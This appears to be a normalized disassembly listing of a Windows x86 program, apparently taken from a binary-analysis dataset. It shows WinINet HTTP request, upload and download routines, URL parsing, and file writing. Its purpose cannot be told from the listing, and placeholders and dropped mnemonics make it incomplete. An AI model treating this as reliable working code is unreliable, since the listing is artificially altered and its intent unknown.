jne r-xdata
sub eax ecx
push eax
push esi
push edi
call memcpy
mov edx [ esp + 0x2c ]
push esi
push edx
call sub_402e30
mov eax esi
add esp 0x14
lea ecx [ eax + 0x1 ]
mov dl [ ecx + 0x1 ]
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
push esi
sub edi 0xffffff80
push edi
call memcpy
mov esi [ esp + 0x1c ]
add esp 0xc
push 0x0
lea eax [ esp + 0x28 ]
push eax
push ebx
push ebp
push esi
call [ WriteFile@IAT ]
push esi
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebp
mov al 0x1
pop ebx
add esp 0x18
retn
cmp eax 0x2
jbe r-xdata
mov al [ ecx + 0x2 ]
cmp al [ esi + 0x2 ]
je r-xdata
sub_4036f0
sub esp 0x130
push esi
mov esi [ esp + 0x140 ]
push r--data
push esi
call strstr
add esp 0x8
test eax eax
je r-xdata
push edi
push 0x80
call ??2@YAPAXI@Z
push 0x40
mov esi eax
call ??2@YAPAXI@Z
push esi
push r--data
mov edi eax
call sub_402ee0
push edi
push r--data
call sub_402ee0
add esp 0x18
lea ecx [ esp + 0x60 ]
call sub_401000
lea ecx [ esp + 0x8 ]
call sub_401450
push esi
push edi
push r--data
lea eax [ esp + 0x6c ]
push eax
lea ecx [ esp + 0x18 ]
call sub_4014b0
lea ecx [ esp + 0x8 ]
call sub_4021a0
lea ecx [ esp + 0x8 ]
call sub_4014a0
lea ecx [ esp + 0x60 ]
call sub_401020
pop edi
xor eax eax
pop esi
add esp 0x130
retn 0x10
push esi
call sub_403490
add esp 0x4
xor eax eax
pop esi
add esp 0x130
retn 0x10
sub_4037b0
push esi
mov esi ecx
mov eax [ esi + 0x418 ]
push edi
mov edi [ InternetCloseHandle@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x414 ]
test eax eax
je r-xdata
push eax
call edi
mov esi [ esi + 0x410 ]
test esi esi
je r-xdata
push eax
call edi
pop edi
pop esi
retn
push esi
call edi
sub_4037f0
push ebp
mov ebp esp
push 0xffffffff
push sub_4058c0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
mov eax [ ebp + 0xc ]
push ebx
push esi
xor bl bl
push edi
mov esi ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x11 ] bl
mov [ ebp - 0x4 ] 0x0
cmp eax 0x8
ja r-xdata
mov edx [ esi + 0x418 ]
push edx
call [ InternetCloseHandle@IAT ]
mov [ esi + 0x418 ] 0x0
jmp [ eax * 4 + jump_table_403974 ]
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
mov eax [ esi ]
mov edi [ ebp + 0x8 ]
mov eax [ eax + 0x20 ]
push ecx
push edx
push edi
mov ecx esi
mov eax [ ebp + 0x10 ]
mov edx [ esi ]
mov edi [ ebp + 0x8 ]
mov edx [ edx + 0x1c ]
push eax
push edi
mov ecx esi
call edx
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
mov eax [ esi ]
mov edi [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
push ecx
push edx
push edi
mov ecx esi
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
mov edx [ esi ]
mov edi [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
push eax
push ecx
push edi
mov ecx esi
call edx
jmp r-xdata
push 0x0
push 0x1
jmp r-xdata
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ esi ]
mov edi [ ebp + 0x8 ]
push ecx
mov ecx [ ebp + 0x10 ]
push edx
mov edx [ eax + 0x14 ]
push ecx
push edi
mov ecx esi
call edx
jmp r-xdata
mov esi [ esi + 0x41c ]
mov ecx edi
lea esp [ esp ]
mov bl al
test bl bl
je r-xdata
call eax
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ esi ]
mov edi [ ebp + 0x8 ]
push ecx
mov ecx [ ebp + 0x10 ]
push edx
mov edx [ eax + 0x18 ]
push ecx
push edi
mov ecx esi
call edx
jmp r-xdata
mov al [ ecx ]
mov [ esi ] al
inc ecx
inc esi
test al al
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov al bl
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_4039a0
push edi
mov edi ecx
mov eax [ edi + 0x414 ]
test eax eax
je r-xdata
push r--data
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0x14 ] r--data
call _CxxThrowException
cmp eax 0xffffffff
je r-xdata
mov edx [ esp + 0xc ]
xor ecx ecx
cmp [ edi + 0x430 ] 0x2
push 0x0
setne cl
dec ecx
and ecx 0x800000
or ecx 0x4000000
push ecx
mov ecx [ esp + 0x10 ]
push 0x0
push edx
push r--data
push ecx
push r--data
push eax
call [ HttpOpenRequestA@IAT ]
mov [ edi + 0x418 ] eax
test eax eax
je r-xdata
push r--data
lea edx [ esp + 0x10 ]
push edx
mov [ esp + 0x14 ] r--data
call _CxxThrowException
cmp eax 0xffffffff
je r-xdata
push esi
mov esi [ esp + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x418 ]
push 0x0
push 0x0
push 0x0
push 0x0
push eax
call [ HttpSendRequestA@IAT ]
test eax eax
jne r-xdata
mov ecx esi
push ebx
lea ebx [ ecx + 0x1 ]
lea esp [ esp ]
pop esi
mov al 0x1
pop edi
retn 0xc
push r--data
lea ecx [ esp + 0x14 ]
push ecx
mov [ esp + 0x18 ] r--data
call _CxxThrowException
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
push 0x10000000
sub ecx ebx
push ecx
push esi
push eax
call [ HttpAddRequestHeadersA@IAT ]
pop ebx
test eax eax
jne r-xdata
push r--data
lea edx [ esp + 0x14 ]
push edx
mov [ esp + 0x18 ] r--data
call _CxxThrowException
sub_403ae0
push esi
mov esi ecx
mov eax [ esi + 0x414 ]
test eax eax
je r-xdata
push r--data
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0x14 ] r--data
call _CxxThrowException
cmp eax 0xffffffff
je r-xdata
mov edx [ esp + 0xc ]
xor ecx ecx
cmp [ esi + 0x430 ] 0x2
push 0x0
setne cl
dec ecx
and ecx 0x800000
or ecx 0x4400040
push ecx
mov ecx [ esp + 0x10 ]
push rw-data
push edx
push r--data
push ecx
push r--data
push eax
call [ HttpOpenRequestA@IAT ]
mov [ esi + 0x418 ] eax
test eax eax
je r-xdata
push r--data
lea edx [ esp + 0x10 ]
push edx
mov [ esp + 0x14 ] r--data
call _CxxThrowException
cmp eax 0xffffffff
je r-xdata
push 0x80000000
push 0x36
push r--data
push eax
call [ HttpAddRequestHeadersA@IAT ]
test eax eax
jne r-xdata
push ebx
push ebp
push edi
mov ecx esi
call sub_402e00
lea ebx [ eax + 0x1 ]
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ebp [ rw-data ]
mov edi eax
mov eax ebp
lea edx [ eax + 0x1 ]
push r--data
lea edx [ esp + 0x10 ]
push edx
mov [ esp + 0x14 ] r--data
call _CxxThrowException
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
push ebx
sub eax edx
push edi
mov ecx esi
mov edx eax
call sub_403ad0
push eax
mov eax [ esi + 0x418 ]
push edi
push edx
push ebp
push eax
call [ HttpSendRequestA@IAT ]
test eax eax
jne r-xdata
push edi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
pop edi
pop ebp
pop ebx
mov al 0x1
pop esi
retn 0x8
call [ GetLastError@IAT ]
cmp eax 0x2f88
je r-xdata
push edi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push r--data
lea ecx [ esp + 0x1c ]
push ecx
mov [ esp + 0x20 ] r--data
call _CxxThrowException
sub_403c50
sub esp 0x404
push esi
mov esi ecx
mov eax [ esi + 0x414 ]
test eax eax
je r-xdata
push r--data
lea edx [ esp + 0x8 ]
push edx
mov [ esp + 0xc ] r--data
call _CxxThrowException
cmp eax 0xffffffff
je r-xdata
mov edx [ esp + 0x410 ]
xor ecx ecx
cmp [ esi + 0x430 ] 0x2
push 0x0
setne cl
dec ecx
and ecx 0x800000
or ecx 0x4400040
push ecx
mov ecx [ esp + 0x414 ]
push 0x0
push edx
push r--data
push ecx
push r--data
push eax
call [ HttpOpenRequestA@IAT ]
mov [ esi + 0x418 ] eax
test eax eax
je r-xdata
push r--data
lea ecx [ esp + 0x8 ]
push ecx
mov [ esp + 0xc ] r--data
call _CxxThrowException
cmp eax 0xffffffff
je r-xdata
push edi
mov edi [ esp + 0x418 ]
test edi edi
jne r-xdata
mov ecx edi
push ebx
lea ebx [ ecx + 0x1 ]
mov edi [ HttpAddRequestHeadersA@IAT ]
push 0x10000000
push 0x36
push r--data
push eax
call edi
test eax eax
jne r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
push 0x10000000
sub ecx ebx
push ecx
push edi
mov edi [ HttpAddRequestHeadersA@IAT ]
push eax
call edi
pop ebx
test eax eax
jne r-xdata
xor ecx ecx
push 0x3fe
push ecx
lea edx [ esp + 0x16 ]
push edx
mov [ esp + 0x18 ] cx
call memset
mov eax [ esi + 0x40c ]
push eax
lea ecx [ esp + 0x1c ]
push r--data
push ecx
call sprintf
lea eax [ esp + 0x24 ]
add esp 0x18
lea edx [ eax + 0x1 ]
push r--data
lea edx [ esp + 0xc ]
push edx
mov [ esp + 0x10 ] r--data
call _CxxThrowException
push r--data
lea eax [ esp + 0xc ]
push eax
mov [ esp + 0x10 ] r--data
call _CxxThrowException
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push 0x10000000
push eax
mov eax [ esi + 0x418 ]
lea edx [ esp + 0x14 ]
push edx
push eax
call edi
test eax eax
jne r-xdata
mov edx [ rw-data ]
mov eax edx
lea edi [ eax + 0x1 ]
push r--data
lea ecx [ esp + 0xc ]
push ecx
mov [ esp + 0x10 ] r--data
call _CxxThrowException
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ esi + 0x40c ]
push ecx
mov ecx [ esi + 0x4 ]
push ecx
sub eax edi
push eax
push edx
mov edx [ esi + 0x418 ]
push edx
call [ HttpSendRequestA@IAT ]
test eax eax
jne r-xdata
push 0x0
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
pop edi
mov al 0x1
pop esi
add esp 0x404
retn 0xc
call [ GetLastError@IAT ]
cmp eax 0x2f88
je r-xdata
push 0x0
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push r--data
lea eax [ esp + 0xc ]
push eax
mov [ esp + 0x10 ] r--data
call _CxxThrowException
sub_403e60
sub esp 0x404
push esi
mov esi ecx
mov eax [ esi + 0x414 ]
test eax eax
je r-xdata
push r--data
lea edx [ esp + 0x8 ]
push edx
mov [ esp + 0xc ] r--data
call _CxxThrowException
cmp eax 0xffffffff
je r-xdata
mov edx [ esp + 0x410 ]
xor ecx ecx
cmp [ esi + 0x430 ] 0x2
push 0x0
setne cl
dec ecx
and ecx 0x800000
or ecx 0x4400040
push ecx
mov ecx [ esp + 0x414 ]
push 0x0
push edx
push r--data
push ecx
push r--data
push eax
call [ HttpOpenRequestA@IAT ]
mov [ esi + 0x418 ] eax
test eax eax
je r-xdata
push r--data
lea ecx [ esp + 0x8 ]
push ecx
mov [ esp + 0xc ] r--data
call _CxxThrowException
cmp eax 0xffffffff
je r-xdata
push edi
mov edi [ esp + 0x418 ]
test edi edi
jne r-xdata
mov ecx edi
push ebx
lea ebx [ ecx + 0x1 ]
mov edi [ HttpAddRequestHeadersA@IAT ]
push 0x10000000
push 0x36
push r--data
push eax
call edi
test eax eax
jne r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
push 0x10000000
sub ecx ebx
push ecx
push edi
mov edi [ HttpAddRequestHeadersA@IAT ]
push eax
call edi
pop ebx
test eax eax
jne r-xdata
xor ecx ecx
push 0x3fe
push ecx
lea edx [ esp + 0x16 ]
push edx
mov [ esp + 0x18 ] cx
call memset
mov eax [ esi + 0x40c ]
push eax
lea ecx [ esp + 0x1c ]
push r--data
push ecx
call sprintf
lea eax [ esp + 0x24 ]
add esp 0x18
lea edx [ eax + 0x1 ]
push r--data
lea edx [ esp + 0xc ]
push edx
mov [ esp + 0x10 ] r--data
call _CxxThrowException
push r--data
lea eax [ esp + 0xc ]
push eax
mov [ esp + 0x10 ] r--data
call _CxxThrowException
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push 0x10000000
push eax
mov eax [ esi + 0x418 ]
lea edx [ esp + 0x14 ]
push edx
push eax
call edi
test eax eax
jne r-xdata
mov edx [ esp + 0x41c ]
mov eax edx
lea edi [ eax + 0x1 ]
push r--data
lea ecx [ esp + 0xc ]
push ecx
mov [ esp + 0x10 ] r--data
call _CxxThrowException
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ esi + 0x40c ]
push ecx
mov ecx [ esi + 0x4 ]
push ecx
sub eax edi
push eax
push edx
mov edx [ esi + 0x418 ]
push edx
call [ HttpSendRequestA@IAT ]
test eax eax
jne r-xdata
push 0x0
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
pop edi
mov al 0x1
pop esi
add esp 0x404
retn 0x10
call [ GetLastError@IAT ]
cmp eax 0x2f88
je r-xdata
push 0x0
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push r--data
lea eax [ esp + 0xc ]
push eax
mov [ esp + 0x10 ] r--data
call _CxxThrowException
sub_404080
sub esp 0x404
push esi
mov esi ecx
mov eax [ esi + 0x414 ]
test eax eax
je r-xdata
push r--data
lea edx [ esp + 0x8 ]
push edx
mov [ esp + 0xc ] r--data
call _CxxThrowException
cmp eax 0xffffffff
je r-xdata
mov edx [ esp + 0x410 ]
xor ecx ecx
cmp [ esi + 0x430 ] 0x2
push 0x0
setne cl
dec ecx
and ecx 0x800000
or ecx 0x4400040
push ecx
mov ecx [ esp + 0x414 ]
push 0x0
push edx
push r--data
push ecx
push r--data
push eax
call [ HttpOpenRequestA@IAT ]
mov [ esi + 0x418 ] eax
test eax eax
je r-xdata
push r--data
lea ecx [ esp + 0x8 ]
push ecx
mov [ esp + 0xc ] r--data
call _CxxThrowException
cmp eax 0xffffffff
je r-xdata
push edi
mov edi [ esp + 0x418 ]
test edi edi
jne r-xdata
mov ecx edi
push ebx
lea ebx [ ecx + 0x1 ]
mov edi [ HttpAddRequestHeadersA@IAT ]
push 0x10000000
push 0x36
push r--data
push eax
call edi
test eax eax
jne r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
push 0x10000000
sub ecx ebx
push ecx
push edi
mov edi [ HttpAddRequestHeadersA@IAT ]
push eax
call edi
pop ebx
test eax eax
jne r-xdata
xor ecx ecx
push 0x3fe
push ecx
lea edx [ esp + 0x16 ]
push edx
mov [ esp + 0x18 ] cx
call memset
mov eax [ esi + 0x40c ]
push eax
lea ecx [ esp + 0x1c ]
push r--data
push ecx
call sprintf
lea eax [ esp + 0x24 ]
add esp 0x18
lea edx [ eax + 0x1 ]
push r--data
lea edx [ esp + 0xc ]
push edx
mov [ esp + 0x10 ] r--data
call _CxxThrowException
push r--data
lea eax [ esp + 0xc ]
push eax
mov [ esp + 0x10 ] r--data
call _CxxThrowException
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push 0x10000000
push eax
mov eax [ esi + 0x418 ]
lea edx [ esp + 0x14 ]
push edx
push eax
call edi
test eax eax
jne r-xdata
mov edx [ rw-data ]
mov eax edx
lea edi [ eax + 0x1 ]
push r--data
lea ecx [ esp + 0xc ]
push ecx
mov [ esp + 0x10 ] r--data
call _CxxThrowException
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ esi + 0x40c ]
push ecx
mov ecx [ esi + 0x4 ]
push ecx
sub eax edi
push eax
push edx
mov edx [ esi + 0x418 ]
push edx
call [ HttpSendRequestA@IAT ]
test eax eax
jne r-xdata
push 0x0
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
pop edi
mov al 0x1
pop esi
add esp 0x404
retn 0xc
call [ GetLastError@IAT ]
cmp eax 0x2f88
je r-xdata
push 0x0
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push r--data
lea eax [ esp + 0xc ]
push eax
mov [ esp + 0x10 ] r--data
call _CxxThrowException
sub_4042a0
sub esp 0x40c
push ebp
push esi
push edi
push 0x400
mov ebp ecx
call ??2@YAPAXI@Z
mov [ esp + 0x14 ] eax
mov edi eax
mov ecx 0x39
mov esi r--data
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov eax [ ebp + 0x414 ]
add esp 0x4
test eax eax
je r-xdata
push r--data
lea edx [ esp + 0x10 ]
push edx
mov [ esp + 0x14 ] r--data
call _CxxThrowException
cmp eax 0xffffffff
je r-xdata
xor ecx ecx
cmp [ ebp + 0x430 ] 0x2
push 0x0
setne cl
lea edx [ esp + 0x14 ]
dec ecx
and ecx 0x800000
or ecx 0x4400040
push ecx
mov ecx [ esp + 0x428 ]
push edx
mov edx [ esp + 0x428 ]
push ecx
push r--data
push edx
push r--data
push eax
call [ HttpOpenRequestA@IAT ]
mov [ ebp + 0x418 ] eax
test eax eax
je r-xdata
push r--data
lea ecx [ esp + 0x10 ]
push ecx
mov [ esp + 0x14 ] r--data
call _CxxThrowException
cmp eax 0xffffffff
je r-xdata
mov esi [ esp + 0x10 ]
mov ecx esi
lea edi [ ecx + 0x1 ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
push 0x80000000
sub ecx edi
push ecx
push esi
mov esi [ HttpAddRequestHeadersA@IAT ]
push eax
call esi
test eax eax
jne r-xdata
mov edx [ esp + 0x428 ]
mov eax edx
lea edi [ eax + 0x1 ]
push r--data
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0x14 ] r--data
call _CxxThrowException
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ ebp + 0x418 ]
push 0x10000000
sub eax edi
push eax
push edx
push ecx
call esi
test eax eax
jne r-xdata
xor eax eax
push 0x3fe
push eax
lea ecx [ esp + 0x22 ]
push ecx
mov [ esp + 0x24 ] ax
call memset
mov edx [ ebp + 0x40c ]
push edx
lea eax [ esp + 0x28 ]
push r--data
push eax
call sprintf
lea eax [ esp + 0x30 ]
add esp 0x18
lea edx [ eax + 0x1 ]
push r--data
lea edx [ esp + 0x10 ]
push edx
mov [ esp + 0x14 ] r--data
call _CxxThrowException
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
push 0x10000000
sub eax edx
mov edx [ ebp + 0x418 ]
push eax
lea ecx [ esp + 0x20 ]
push ecx
push edx
call esi
test eax eax
jne r-xdata
push 0x0
push 0x8
push 0x0
mov [ rw-data ] 0x28
mov [ rw-data ] 0x0
mov ecx [ ebp + 0x418 ]
push rw-data
push ecx
call [ HttpSendRequestExA@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0x14 ] r--data
call _CxxThrowException
mov ecx [ ebp + 0x40c ]
mov edx [ ebp + 0x4 ]
lea eax [ esp + 0x14 ]
push eax
mov eax [ ebp + 0x418 ]
push ecx
push edx
push eax
mov [ esp + 0x24 ] 0x0
call [ InternetWriteFile@IAT ]
test eax eax
jne r-xdata
push r--data
lea edx [ esp + 0x10 ]
push edx
mov [ esp + 0x14 ] r--data
call _CxxThrowException
mov edx [ ebp + 0x418 ]
push 0x0
push 0x8
push 0x0
push edx
call [ HttpEndRequestA@IAT ]
test eax eax
jne r-xdata
push r--data
lea ecx [ esp + 0x10 ]
push ecx
mov [ esp + 0x14 ] r--data
call _CxxThrowException
pop edi
pop esi
mov al 0x1
pop ebp
add esp 0x40c
retn 0x14
push r--data
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0x14 ] r--data
call _CxxThrowException
sub_404520
mov edx [ esp + 0x4 ]
push 0x0
lea eax [ esp + 0xc ]
push eax
mov eax [ ecx + 0x418 ]
push edx
push 0x16
push eax
call [ HttpQueryInfoA@IAT ]
neg eax
sbb eax eax
and eax [ esp + 0x8 ]
retn 0x8
sub_404550
push ebp
mov ebp esp
push 0xffffffff
push sub_4058d0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
mov eax [ ecx + 0x418 ]
push ebx
xor edx edx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x4 ] edx
cmp eax edx
jne r-xdata
mov edx [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
push ecx
push eax
call [ InternetReadFile@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ ebp - 0x1c ]
push eax
mov [ ebp - 0x1c ] r--data
call _CxxThrowException
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push r--data
lea edx [ ebp - 0x20 ]
push edx
mov [ ebp - 0x20 ] r--data
call _CxxThrowException
sub_404620
sub esp 0x40c
push ebx
push ebp
mov ebp [ esp + 0x418 ]
mov eax ebp
xor ebx ebx
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
push esi
push edi
push 0x1
lea ecx [ ebx + ebp + 0x1 ]
push r--data
push ecx
call strncmp
mov esi [ esp + 0x430 ]
add esp 0xc
test eax eax
jne r-xdata
mov eax ebp
lea edx [ eax + 0x1 ]
test esi esi
je r-xdata
test esi esi
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
cmp ebx eax
jae r-xdata
xor ebx ebx
xor edi edi
xor esi esi
mov [ esp + 0x18 ] esi
push 0x4
push r--data
push esi
call strncpy
add esp 0xc
mov [ esi + 0x5 ] 0x0
add ebx 0x3
mov edi ebx
mov esi ebx
mov [ esp + 0x18 ] ebx
jmp r-xdata
push ebx
push ebp
push esi
call strncpy
add esp 0xc
mov [ ebx + esi ] 0x0
push 0x1
lea eax [ ebx + ebp ]
push r--data
push eax
call strncmp
add esp 0xc
test eax eax
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
mov eax ebp
mov [ esp + 0x10 ] edi
lea edx [ eax + 0x1 ]
mov eax ebp
inc ebx
lea edx [ eax + 0x1 ]
mov eax ebp
lea edx [ eax + 0x1 ]
mov eax ebp
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
cmp esi eax
jae r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
cmp esi eax
jae r-xdata
mov eax ebp
lea edx [ eax + 0x1 ]
mov edi [ esp + 0x10 ]
mov eax ebp
lea edx [ eax + 0x1 ]
mov edi edi
mov [ esp + 0x18 ] esi
mov eax ebp
inc esi
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
jne r-xdata
mov esi edi
cmp edi ebx
ja r-xdata
lea ecx [ ecx ]
cmp edi esi
jae r-xdata
jmp r-xdata
mov eax [ esp + 0x424 ]
mov ecx r--data
lea esp [ esp ]
push 0x1
lea eax [ esi + ebp ]
push r--data
push eax
call strncmp
add esp 0xc
test eax eax
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
cmp ebx eax
jae r-xdata
lea ebx [ esi + 0x1 ]
mov [ esp + 0x10 ] ebx
mov edi ebx
mov eax [ esp + 0x10 ]
mov ebx [ esp + 0x428 ]
mov esi edi
sub esi eax
push esi
add eax ebp
push eax
push ebx
call strncpy
mov [ esi + ebx + 0x1 ] 0x0
mov esi [ esp + 0x24 ]
sub esi edi
lea eax [ esi - 0x1 ]
push eax
lea ecx [ edi + ebp + 0x1 ]
mov edi [ esp + 0x43c ]
push ecx
push edi
call strncpy
mov [ esi + edi ] 0x0
mov esi [ esp + 0x30 ]
add esp 0x18
mov eax ebp
lea edx [ eax + 0x1 ]
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
xor ecx ecx
push 0x3fe
push ecx
lea edx [ esp + 0x26 ]
push edx
mov [ esp + 0x28 ] cx
call memset
mov eax ebx
sub eax esi
push eax
lea ecx [ esi + ebp + 0x1 ]
push ecx
lea edx [ esp + 0x30 ]
push edx
call strncpy
lea eax [ esp + 0x34 ]
push eax
call atol
mov edx [ esp + 0x44c ]
mov ecx [ esp + 0x450 ]
sub esi edi
push esi
add edi ebp
push edi
push edx
mov [ ecx ] eax
call strncpy
add esp 0x28
jmp r-xdata
inc esi
cmp esi ebx
jbe r-xdata
push 0x1
lea edx [ ebx + ebp ]
push r--data
push edx
call strncmp
add esp 0xc
test eax eax
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
cmp ebx eax
jae r-xdata
mov eax [ esp + 0x424 ]
mov ecx r--data
lea ecx [ ecx ]
mov eax [ esp + 0x434 ]
mov [ eax ] 0x1bb
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov eax ebp
pop edi
lea edx [ eax + 0x1 ]
pop esi
lea ecx [ ecx ]
mov eax ebp
inc ebx
lea edx [ eax + 0x1 ]
nop
push 0x1
lea edx [ edi + ebp ]
push r--data
push edx
call strncmp
add esp 0xc
test eax eax
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
mov edx [ esp + 0x430 ]
mov ecx ebx
sub ecx edi
push ecx
add edi ebp
push edi
push edx
call strncpy
add esp 0xc
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
cmp ebx eax
jae r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
jne r-xdata
mov eax ebp
inc edi
lea edx [ eax + 0x1 ]
nop
mov [ eax ] 0x50
mov [ eax ] 0x15
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov eax [ esp + 0x430 ]
pop ebp
mov [ eax ] 0x2f
mov [ eax + 0x1 ] 0x0
pop ebx
add esp 0x40c
retn
mov eax ebp
lea edx [ eax + 0x1 ]
mov eax ebp
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
jne r-xdata
test eax eax
mov eax [ esp + 0x434 ]
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
sub eax ebx
push eax
mov eax [ esp + 0x434 ]
add ebx ebp
push ebx
push eax
call strncpy
add esp 0xc
pop ebp
pop ebx
add esp 0x40c
retn
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_4049e0
mov eax 0x1408
call sub_404e90
push ebx
push ebp
push esi
push edi
xor eax eax
push 0x3fe
mov ebx ecx
push eax
lea ecx [ esp + 0x22 ]
push ecx
mov [ esp + 0x24 ] ax
call memset
xor edx edx
push 0x3fe
push edx
lea eax [ esp + 0x82e ]
push eax
mov [ esp + 0x830 ] dx
call memset
xor ecx ecx
push 0x3fe
push ecx
lea edx [ esp + 0x43a ]
push edx
mov [ esp + 0x43c ] cx
call memset
xor eax eax
push 0x3fe
push eax
lea ecx [ esp + 0x1046 ]
push ecx
mov [ esp + 0x1048 ] ax
call memset
xor edx edx
push 0x3fe
push edx
lea eax [ esp + 0xc52 ]
push eax
mov [ esp + 0xc54 ] dx
call memset
lea ecx [ esp + 0xc54 ]
push ecx
lea edx [ esp + 0x50 ]
push edx
lea eax [ esp + 0x105c ]
push eax
lea ecx [ esp + 0x460 ]
push ecx
mov ecx [ esp + 0x1468 ]
lea edx [ esp + 0x864 ]
push edx
lea eax [ esp + 0x68 ]
push eax
push ecx
mov [ esp + 0x68 ] 0x0
call sub_404620
add esp 0x58
push 0x5
lea edx [ esp + 0x1c ]
push r--data
push edx
call strncmp
add esp 0xc
test eax eax
jne r-xdata
push 0x4
lea eax [ esp + 0x1c ]
push r--data
push eax
call strncmp
add esp 0xc
test eax eax
jne r-xdata
lea ebp [ eax + 0x2 ]
jmp r-xdata
push 0x3
lea ecx [ esp + 0x1c ]
push r--data
push ecx
call strncmp
add esp 0xc
test eax eax
jne r-xdata
lea ebp [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebx + 0x41c ]
lea ecx [ esp + 0xc18 ]
mov ebp [ esp + 0x10 ]
xor ebp ebp
jmp r-xdata
mov al [ ecx ]
mov [ edx ] al
inc ecx
inc edx
test al al
jne r-xdata
mov esi [ esp + 0x1424 ]
test esi esi
jne r-xdata
